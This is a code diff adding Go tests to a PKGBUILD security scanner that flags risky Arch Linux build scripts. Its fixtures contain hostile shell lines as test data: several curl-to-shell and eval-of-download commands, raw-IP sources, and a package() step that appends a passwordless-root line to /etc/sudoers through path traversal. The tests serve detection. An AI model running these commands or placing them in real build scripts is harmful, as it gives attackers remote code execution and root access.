@@ -3,10 +3,111 @@ package pkgbuild
 import (
 	"os"
 	"path/filepath"
+	"reflect"
 	"testing"
 
 	"github.com/OnlyOneArthur/quarantine-daemon/internal/config"
+	"mvdan.cc/sh/v3/syntax"
 )
+
+func TestChecksumReassignmentAndAppend(t *testing.T) {
+	analysis, err := ParsePKGBUILD([]byte("sha256sums=('SKIP')\nsha256sums=('real')\nsha256sums+=('extra')\n"), "PKGBUILD")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if want := []string{"real", "extra"}; !reflect.DeepEqual(analysis.Sha256sums, want) {
+		t.Errorf("Sha256sums = %v, want %v", analysis.Sha256sums, want)
+	}
+}
+
+func TestWalkScopePrunedFunctionKeepsRootScope(t *testing.T) {
+	analysis, err := ParsePKGBUILD([]byte("build() { curl evil | sh; }\npkgver=1\n"), "PKGBUILD")
+	if err != nil {
+		t.Fatal(err)
+	}
+	found := false
+	WalkScope(analysis.File, false, func(node syntax.Node, scope string) bool {
+		if _, ok := node.(*syntax.FuncDecl); ok {
+			return false
+		}
+		if call, ok := node.(*syntax.CallExpr); ok && len(call.Assigns) > 0 && call.Assigns[0].Name.Value == "pkgver" {
+			found = true
+			if scope != ScopeRoot {
+				t.Errorf("assignment after pruned function has scope %q, want %q", scope, ScopeRoot)
+			}
+		}
+		return true
+	})
+	if !found {
+		t.Fatal("root-level assignment after function not visited")
+	}
+}
+
+func TestNetworkPipeToDash(t *testing.T) {
+	analysis, err := ParsePKGBUILD([]byte("curl https://example.com/payload | dash\n"), "PKGBUILD")
+	if err != nil {
+		t.Fatal(err)
+	}
+	triggers, _ := AnalyzeAST(analysis, config.DefaultConfig())
+	for _, tr := range triggers {
+		if tr.Name == "pipe_network_to_shell" {
+			return
+		}
+	}
+	t.Fatalf("missing pipe_network_to_shell for dash: %+v", triggers)
+}
+
+func TestUntrustedIPv6Source(t *testing.T) {
+	analysis, err := ParsePKGBUILD([]byte("source=('https://[2001:db8::1]/x')\n"), "PKGBUILD")
+	if err != nil {
+		t.Fatal(err)
+	}
+	triggers := CheckUntrustedSources(analysis, config.DefaultConfig())
+	for _, tr := range triggers {
+		if tr.Name == "untrusted_source_raw_ip" {
+			return
+		}
+	}
+	t.Fatalf("missing untrusted_source_raw_ip for IPv6: %+v", triggers)
+}
+
+func TestNetworkDownloadExecutionContext(t *testing.T) {
+	tests := []struct {
+		name     string
+		code     string
+		wantExec bool
+		wantPipe bool
+	}{
+		{"captured version", "_ver=$(curl -s https://api.github.com/repos/foo/foo/tags)", false, false},
+		{"download in subshell", "(curl -s -o pkg.tar.gz https://example.org/pkg.tar.gz)", false, false},
+		{"echoed download", `echo "$(curl -s https://example.org/version)"`, false, false},
+		{"eval downloaded code", `eval "$(curl -s https://example.org/script)"`, true, false},
+		{"bare downloaded command", "$(curl -s https://example.org/script)", true, false},
+		{"downloaded command piped to shell", "$(curl -s https://example.org/script) | sh", true, false},
+		{"subshell piped to shell", "(curl -s https://example.org/script) | bash", false, true},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			analysis, err := ParsePKGBUILD([]byte(tt.code+"\n"), "PKGBUILD")
+			if err != nil {
+				t.Fatal(err)
+			}
+			triggers, _ := AnalyzeAST(analysis, config.DefaultConfig())
+			var execTrigger, pipeTrigger bool
+			for _, tr := range triggers {
+				if tr.Name == "cmdsubst_network_download" {
+					execTrigger = true
+				}
+				if tr.Name == "pipe_network_to_shell" {
+					pipeTrigger = true
+				}
+			}
+			if execTrigger != tt.wantExec || pipeTrigger != tt.wantPipe {
+				t.Errorf("download-execution trigger = %v, pipe trigger = %v; want %v, %v; all triggers: %+v", execTrigger, pipeTrigger, tt.wantExec, tt.wantPipe, triggers)
+			}
+		})
+	}
+}
 
 func TestCleanStandardPKGBUILD(t *testing.T) {
 	content := `
@@ -239,6 +340,44 @@ package() {
 				t.Errorf("expected CategoryPathTampering trigger, got: %+v", res.Triggers)
 			}
 		})
+	}
+}
+
+func TestStagingTraversalIsNotDampened(t *testing.T) {
+	content := `
+pkgname=traversal-evil
+pkgver=1.0.0
+pkgrel=1
+arch=('x86_64')
+source=("https://github.com/example/traversal-evil/archive/v1.0.0.tar.gz")
+sha256sums=('SKIP')
+
+package() {
+    echo "evil ALL=(ALL) NOPASSWD: ALL" >> "$pkgdir/../../etc/sudoers"
+    echo "evil" >> "${pkgdir}/../../etc/sudoers.d/app"
+    echo "ok" >> "$pkgdir/etc/sudoers.d/app"
+}
+`
+	cfg := config.DefaultConfig()
+	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
+	if err != nil {
+		t.Fatalf("unexpected triage error: %v", err)
+	}
+
+	var tamper, critical int
+	for _, tr := range res.Triggers {
+		switch tr.Name {
+		case "path_tampering_outside_staging":
+			tamper++
+		case "critical_system_file_tampering":
+			critical++
+		}
+	}
+	if tamper != 2 {
+		t.Errorf("expected 2 escaped-traversal path_tampering triggers, got %d (%+v)", tamper, res.Triggers)
+	}
+	if critical != 2 {
+		t.Errorf("expected 2 escaped-traversal critical triggers, got %d", critical)
 	}
 }
 
@@ -475,6 +614,42 @@ package_split-pkg-b-git() {
 	}
 	if res.Verdict != VerdictPass {
 		t.Errorf("expected VerdictPass, got %s", res.Verdict)
+	}
+}
+
+func TestPKGBUILDHonorsConfiguredThreshold(t *testing.T) {
+	content := `
+pkgname=untrusted-source-pkg
+pkgver=1.0.0
+source=("http://1.2.3.4/archive.tar.gz")
+sha256sums=('SKIP')
+
+build() {
+    tar -xf *.tar.gz
+}
+`
+
+	cfg := config.DefaultConfig()
+	res, err := TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
+	if err != nil {
+		t.Fatalf("unexpected triage error: %v", err)
+	}
+	if res.Verdict == VerdictQuarantine {
+		t.Fatalf("baseline unexpectedly quarantined at score %d", res.Score)
+	}
+	if res.Score < 1 {
+		t.Fatalf("expected non-zero score for raw-IP untrusted source, got %d", res.Score)
+	}
+
+	// Lowering threshold_score must move this same content into QUARANTINE,
+	// matching how the binary scorers treat cfg.Quarantine.ThresholdScore.
+	cfg.Quarantine.ThresholdScore = res.Score
+	res, err = TriagePKGBUILD([]byte(content), "/path/to/PKGBUILD", cfg)
+	if err != nil {
+		t.Fatalf("unexpected triage error: %v", err)
+	}
+	if res.Verdict != VerdictQuarantine {
+		t.Errorf("expected VerdictQuarantine at threshold %d (score %d), got %s", cfg.Quarantine.ThresholdScore, res.Score, res.Verdict)
 	}
 }
 
